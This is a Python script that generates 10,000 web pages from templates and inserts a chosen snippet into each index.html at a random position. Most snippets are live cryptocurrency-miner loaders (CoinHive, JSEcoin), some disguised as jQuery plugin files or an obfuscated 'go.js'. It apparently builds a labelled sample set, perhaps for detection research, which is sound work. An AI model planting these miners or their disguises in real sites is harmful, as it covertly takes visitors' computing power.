#!/usr/bin/python
from json import loads
from os import listdir, mkdir
from distutils.dir_util import copy_tree
from shutil import rmtree, copyfile
from re import split
from random import random, choice
from string import lowercase

randomInt = lambda x: int(random() * x)
randomStr = lambda n: ''.join(choice(lowercase) for x in range(n))
def inject_code(fname, content):
  if content[0] == '<' and content[-1] == '>':
    content = content[1:][:-1]

  with open(fname, 'rb') as f:
    a = f.read()

  b = split('>\s+<', a)
  b.insert(randomInt(len(b)), content)

  c = '><'.join(b)

  with open(fname, 'wb') as f:
    f.write(c)

base_path = '.'

# read seed
a = None
with open('seed.txt', 'r') as f:
  a = f.read()
a = loads(a)

# read template list
template = listdir(base_path+'/template/')
rmtree(base_path+'/output/', ignore_errors=True)
mkdir(base_path+'/output/')

keyword = ['windmill', 'rok', 'smartphone', 'listenrine', 'electronic', 'coffee', 'hyunki', 'saykim', 'suedragon']

for i in range(10000):
  j ,k = a[i] / 0x10, a[i] % 0x10
  src = base_path+'/template/%s/' % (template[j])
  dst = base_path+'/output/%04d/' % (i)
  copy_tree(src, dst)

  if k == 0:
    x = '<!--' + randomStr(randomInt(100) + 1) + '-->'
  elif k == 1: # COINHIVE JehKQTdWK2WwDl8lOG8Pmx7F3w8K7Z0H
    x = '<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous("JehKQTdWK2WwDl8lOG8Pmx7F3w8K7Z0H", {throttle: 0.3}); if (!miner.isMobile() && !miner.didOptOut(14400)) { miner.start(); }</script>'
  elif k == 2: # COINHIVE w4npHvGBkqousLtpNIel6Hekoy1DWc2i
    copyfile(base_path+'/coinhive.min.js', dst + 'coinhive.min.js')
    x = '<script src="coinhive.min.js"></script><script>new CoinHive.Anonymous("w4npHvGBkqousLtpNIel6Hekoy1DWc2i").start();</script>'
  elif k == 3: # COINHIVE 4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm
    k = keyword[randomInt(len(keyword))]
    copyfile(base_path+'/coinhive.min.js', dst + ('jquery-%s.min.js' % k))
    x = '<script src="jquery-%s.min.js"></script><script>(()=>new CoinHive.Anonymous("4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm").start())()</script>' % k
  elif k == 4: # COINHIVE 4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm
    copyfile(base_path+'/obfuscated.js', dst + 'go.js')
    x = '<script src="go.js"></script><script>(()=>new CoinHive.Anonymous("4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm").start())()</script>'
  elif k == 5: # JSECOIN
    x = '<script type="text/javascript">!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/70204/peter.pagez.kr/0/0/",s.parentNode.insertBefore(t,s)}();</script>'
  elif k == 6: # MYSITE
    copyfile(base_path+'/coinhive.min.js', dst + 'x.js')
    x = "<script src=\"x.js\"></script><script>CoinHive.CONFIG.WEBSOCKET_SHARDS = [[\"wss://wsp02.pagez.kr/proxy\"]];(function(){new CoinHive.Anonymous('44ucPyp3J4j6FZ65yMsTeWjoFsZVCjWvneEgjHSBzd6d927CJELohAdJY4FqPsDU93VS8qZogomNojC18SoMUSnfBnq8RTB').start();})()</script>"

  inject_code(dst + 'index.html', x)

